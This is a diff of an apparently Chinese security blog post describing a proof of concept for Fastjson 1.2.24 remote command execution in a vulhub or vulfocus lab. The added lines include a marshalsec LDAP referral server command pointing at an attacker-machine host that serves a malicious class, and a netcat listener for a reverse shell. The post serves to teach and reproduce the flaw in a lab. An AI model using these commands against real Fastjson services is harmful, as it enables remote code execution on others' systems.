@@ -1,5 +1,6 @@
 ---
 layout: post
+topmost: true
 title: Fastjson 远程命令执行的POC
 categories: [安全漏洞]
 description: Fastjson 远程命令执行的POC
@@ -50,7 +51,7 @@ javac 1.8.0_222
 
 ## 漏洞环境
 靶场选择使用vulhub搭建，网址：<https://github.com/vulhub/vulhub>
-
+或者 [vulfocus：]( https://vulfocus.cn/) 
 下载 vulhub ，找到 `fastjson/1.2.24-rce 目录`，使用docker-compose up -d启动环境。
 
 
@@ -106,7 +107,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://
 ![](https://img-blog.csdnimg.cn/44f5743c5377421088902a9d0c84f511.png)
 
 
-
+>  java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://攻击机IP:8888/#TouchFile" 9999
 
 
 
@@ -192,7 +193,11 @@ public class TouchFile {
 
 #### nc 监听:
 
+`攻击机`执行
+```al
 nc -lvvp 4444
+
+```
 
 访问 FastJson 页面，使用 Burp 抓包，改为 POST 请求，使用 exp 反弹 shell
 
